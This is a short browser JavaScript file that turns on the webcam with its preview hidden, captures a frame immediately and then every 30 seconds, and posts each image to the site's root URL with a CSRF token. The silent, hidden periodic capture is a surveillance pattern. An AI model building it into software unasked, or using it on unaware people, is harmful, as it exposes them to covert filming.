document.addEventListener('DOMContentLoaded', function() {
    const videoElement = document.getElementById('webcam');

    // Start webcam and keep the video element hidden
    navigator.mediaDevices.getUserMedia({ video: true }).then(function (stream) {
      videoElement.srcObject = stream;
      videoElement.onloadeddata = function() {
        videoElement.play();
      };
    }).catch(function (error) {
      console.error('Error accessing webcam: ', error);
    });

    // Function to capture image and send to the server
    function captureAndSendImage() {
      const canvas = document.createElement('canvas');
      canvas.width = videoElement.videoWidth || videoElement.clientWidth;
      canvas.height = videoElement.videoHeight || videoElement.clientHeight;
      canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/jpeg');

      // Get CSRF token from meta tag
      const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

      // Send captured image to the root URL (via an AJAX request)
      const formData = new FormData();
      formData.append('image', imageData);

      fetch('/', {  // Change this to the root path '/'
        method: 'POST',
        headers: {
          'X-CSRFToken': csrfToken  // Include CSRF token in the request headers
        },
        body: formData,
      })
      .then(response => response.json())
      .then(data => {
        console.log('Image successfully sent to the server:', data);
      })
      .catch(error => {
        console.error('Error sending image:', error);
      });
    }

    // Capture and send image immediately, then every 30 seconds
    captureAndSendImage();  // Capture immediately at the start
    setInterval(captureAndSendImage, 30000); // Capture every 30 seconds after that
  });